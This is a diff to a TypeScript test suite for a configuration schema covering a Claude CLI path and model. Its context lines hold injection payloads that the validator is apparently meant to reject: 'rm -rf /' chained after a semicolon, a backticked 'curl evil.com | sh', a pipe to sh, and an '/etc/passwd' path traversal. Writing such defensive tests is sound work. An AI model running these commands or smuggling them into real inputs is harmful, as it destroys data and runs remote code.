@@ -27,7 +27,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
         },
@@ -41,7 +40,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: '/usr/local/bin/claude',
           cliModel: 'sonnet',
         },
@@ -55,7 +53,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: '/opt/claude/bin/claude.v2',
           cliModel: 'sonnet',
         },
@@ -69,7 +66,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude; rm -rf /',
           cliModel: 'sonnet',
         },
@@ -83,7 +79,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'echo bad | sh',
           cliModel: 'sonnet',
         },
@@ -97,7 +92,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: '`curl evil.com | sh`',
           cliModel: 'sonnet',
         },
@@ -111,7 +105,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: '/usr/../../../etc/passwd',
           cliModel: 'sonnet',
         },
@@ -125,7 +118,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: '/path with spaces/claude',
           cliModel: 'sonnet',
         },
@@ -144,7 +136,6 @@ describe('ConfigSchema', () => {
         const config = {
           ...validBaseConfig,
           claude: {
-            backend: 'cli',
             cliPath: 'claude',
             cliModel: model,
           },
@@ -159,7 +150,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet; rm -rf /',
         },
@@ -175,7 +165,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
           contextOptions: [
@@ -196,7 +185,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
           contextOptions: [
@@ -213,7 +201,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
           contextOptions: [
@@ -230,7 +217,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
           contextOptions: [
@@ -247,7 +233,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
           contextOptions: [
@@ -264,7 +249,6 @@ describe('ConfigSchema', () => {
       const config = {
         ...validBaseConfig,
         claude: {
-          backend: 'cli',
           cliPath: 'claude',
           cliModel: 'sonnet',
         },
@@ -395,45 +379,4 @@ describe('ConfigSchema', () => {
     });
   });
 
-  describe('claude.backend validation', () => {
-    it('should require API key when backend is api', () => {
-      const config = {
-        ...validBaseConfig,
-        claude: {
-          backend: 'api',
-          // no apiKey
-        },
-      };
-
-      const result = ConfigSchema.safeParse(config);
-      expect(result.success).toBe(false);
-    });
-
-    it('should accept api backend with API key', () => {
-      const config = {
-        ...validBaseConfig,
-        claude: {
-          backend: 'api',
-          apiKey: 'sk-ant-test-key',
-        },
-      };
-
-      const result = ConfigSchema.safeParse(config);
-      expect(result.success).toBe(true);
-    });
-
-    it('should accept cli backend without API key', () => {
-      const config = {
-        ...validBaseConfig,
-        claude: {
-          backend: 'cli',
-          cliPath: 'claude',
-          cliModel: 'sonnet',
-        },
-      };
-
-      const result = ConfigSchema.safeParse(config);
-      expect(result.success).toBe(true);
-    });
-  });
 });
